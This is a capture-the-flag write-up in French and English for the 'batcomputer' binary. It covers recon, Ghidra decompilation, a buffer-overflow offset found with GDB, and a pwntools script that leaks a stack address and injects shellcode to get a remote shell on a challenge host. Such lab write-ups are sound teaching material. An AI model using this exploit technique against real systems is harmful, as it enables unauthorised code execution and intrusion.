\chapter{Bat computer}
\begin{itemize}
    \item {\bf technics}: 
    \item {\bf Components}: 
    \item {\bf tools}: 
\end{itemize}


\section{Résumé}


\section{recon}

\begin{verbatim}
$ file batcomputer
batcomputer: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), 
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, 
BuildID[sha1]=497abb33ba7b0370d501f173facc947759aa4e22, for GNU/Linux 3.2.0,
stripped
\end{verbatim}

Ok donc stripped

\begin{verbatim}
$ pwntools-pwn checksec --file=batcomputer
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
\end{verbatim}

PIE :( mais stack executable donc on doit pouvoir pop un shell si on a un
    buffer overflow.




\begin{verbatim}
$ ./batcomputer
Welcome to your BatComputer, Batman. What would you like to do?
1. Track Joker
2. Chase Joker
> 1
It was very hard, but Alfred managed to locate him: 0x7ffc06c0bc14
Welcome to your BatComputer, Batman. What would you like to do?
1. Track Joker
2. Chase Joker
> 2
Ok. Let's do this. Enter the password: vhq
The password is wrong.
I can't give you access to the BatMobile!
\end{verbatim}

\begin{verbatim}
$ strings batcomputer

Welcome to your BatComputer, Batman. What would you like to do?
1. Track Joker
2. Chase Joker
It was very hard, but Alfred managed to locate him: %p
Ok. Let's do this. Enter the password:
%15s
b4tp@$$w0rd!
The password is wrong.
I can't give you access to the BatMobile!
Access Granted.
Enter the navigation commands:
Roger that!
Too bad, now who's gonna save Gotham? Alfred?
;*3$"
\end{verbatim}

\section{Ghidra}

\begin{verbatim}
undefined8 FUN_001011ec(void)

{
  int iVar1;
  int local_68;
  char acStack_64 [16];
  undefined auStack_54 [76];

  FUN_001011a9();
  while( true ) {
    while( true ) {
      memset(acStack_64,0,0x10);
      printf(
            "Welcome to your BatComputer, Batman. What would you like to do?\n1. Track Joker\n2. Cha se Joker\n> "
            );
      __isoc99_scanf(&DAT_00102069,&local_68);
      if (local_68 != 1) break;
      printf("It was very hard, but Alfred managed to locate him: %p\n",auStack_54);
    }
    if (local_68 != 2) break;
    printf("Ok. Let\'s do this. Enter the password: ");
    __isoc99_scanf(&DAT_001020d0,acStack_64);
    iVar1 = strcmp(acStack_64,"b4tp@$$w0rd!");
    if (iVar1 != 0) {
      puts("The password is wrong.\nI can\'t give you access to the BatMobile!");
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    printf("Access Granted. \nEnter the navigation commands: ");
    read(0,auStack_54,0x89);
    puts("Roger that!");
  }
  puts("Too bad, now who\'s gonna save Gotham? Alfred?");
  return 0;
}
\end{verbatim}

Sur la l'introduction de la commande de navigation il y a un buffer overflow
puisque l'on lit \verb+0x89+ (137 bytes) sur un buffer de 76. Si on somme les
vars locales on obtient 100 (16+4+4+76) donc on doit atteindre \verb+rip+

\section{Building the exploit}

\subsection{find the payload usefull size}

Comme le programme est stripped et que PIE est actif pour mettre le breakpoint
il faut faire un \verb+info file+

\begin{verbatim}
gef>  info file
Native process:
        Using the running image of child Thread 0x7ffff7fa2640 (LWP 3403945).
        While running this, GDB does not access memory from...
Local exec file:
        Entry point: 0x5555555550b0
\end{verbatim}

du coup pour avoir l'équivalent de \verb+disas main+ il faudra utiliser
\verb+x/NBi $pc+

en comparant avec ghidra on sait que l'input a lieu en \verb+0x5555555552f7+
donc \verb+[rbp-0x60]+

\begin{verbatim}
   0x5555555552d1:      lea    rdi,[rip+0xe58]        # 0x555555556130
   0x5555555552d8:      mov    eax,0x0
   0x5555555552dd:      call   0x555555555040 <printf@plt>
   0x5555555552e2:      lea    rax,[rbp-0x60]
   0x5555555552e6:      add    rax,0x14
   0x5555555552ea:      mov    edx,0x89
   0x5555555552ef:      mov    rsi,rax
   0x5555555552f2:      mov    edi,0x0
   0x5555555552f7:      call   0x555555555060 <read@plt>
   0x5555555552fc:      lea    rdi,[rip+0xe5e]        # 0x555555556161
   0x555555555303:      call   0x555555555030 <puts@plt>
   0x555555555308:      jmp    0x5555555551fe
   0x55555555530d:      lea    rdi,[rip+0xe5c]        # 0x555555556170
   0x555555555314:      call   0x555555555030 <puts@plt>
   0x555555555319:      mov    eax,0x0
\end{verbatim}

Trouver l'addresse du début du buffer (\verb+0x7fffffffc044+):
\begin{verbatim}
gef>  search-pattern AAAA
[+] Searching 'AAAA' in memory
[+] In '[stack]'(0x7ffffffdc000-0x7ffffffff000), permission=rwx
  0x7fffffffc044 - 0x7fffffffc04a  →   "AAAA\n"
\end{verbatim}

trouver l'addresse de RIP (\verb+:0x7fffffffc098+):
\begin{verbatim}
gef>  info frame
Stack level 0, frame at 0x7fffffffc0a0:
 rip = 0x5555555552fc; saved rip = 0x7ffff7ddd290
 called by frame at 0x7fffffffc140
 Arglist at 0x7fffffffc028, args:
 Locals at 0x7fffffffc028, Previous frame's sp is 0x7fffffffc0a0
 Saved registers:
  rbp at 0x7fffffffc090, rip at 0x7fffffffc098
\end{verbatim}

on obient la taille du payload:
\begin{verbatim}
$ echo 'ibase=16;98-44' | bc
84
\end{verbatim}


\subsection{build the payload}

petit problème: après l'injection de l'exploit on repart pour une boucle. par
contre si l'on saisie autre chose que 1 ou 2 on fini par sortir.

maintenant pour le payload il faut un shell.


\begin{verbatim}
$ pwntools-pwn template --host 134.209.22.69  --port 30290 batcomputer > pwn-batcomputer.py
\end{verbatim}


\begin{verbatim}
io = start()

io.clean()
io.sendline("1")
io.recvuntil('0x')
stack_base = int(("0x"+io.recv().decode().split()[0]), 16)
log.success(f'stack base: {hex(stack_base)}')

shell = asm(shellcraft.popad() + shellcraft.sh())
payload = b'\x90' * (84 - len(shell))
payload += shell
payload += p64(stack_base)
log.info(f"payload: {payload} ")


print(io.clean())
print(io.clean())
io.sendline("2")
print(io.clean())
io.sendline("b4tp@$$w0rd!")
print(io.clean())
io.sendline(payload)
print(io.clean())
io.sendline("3")
io.interactive()
\end{verbatim}
